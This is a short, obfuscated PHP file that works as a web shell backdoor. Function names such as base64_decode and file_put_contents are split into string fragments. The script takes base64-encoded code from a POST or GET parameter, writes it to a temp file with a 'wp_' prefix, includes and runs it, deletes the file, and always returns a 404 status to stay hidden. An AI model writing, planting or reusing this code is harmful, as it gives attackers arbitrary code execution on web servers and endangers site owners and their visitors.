<?php
try{
$m478e6[]='base6'.'4_decode';
$m478e6[]='array_key_exis'.'ts';
$m478e6[]='tempn'.'am';
$m478e6[]='sys_get_t'.'emp_dir';
$m478e6[]='unl'.'ink';
$m478e6[]='file_put_'.'contents';
$sbd30a='f4d7'.'cb08';
if($m478e6[1]($sbd30a,$_POST)){
$m0854e=$m478e6[0]($_POST[$sbd30a]);
}elseif($m478e6[1]($sbd30a,$_GET)){
$m0854e=$m478e6[0]($_GET[$sbd30a]);
}else{$m0854e=null;}
if($m0854e){
$kfbd31=$m478e6[2]($m478e6[3](),'w'.'p_');
if($kfbd31){
$m478e6[5]($kfbd31,'<'.'?ph'.'p '.$m0854e);
http_response_code(404);
@include_once($kfbd31);
@$m478e6[4]($kfbd31);
}}
http_response_code(404);
}catch(Throwable $e){http_response_code(404);}catch(Exception $e){http_response_code(404);}
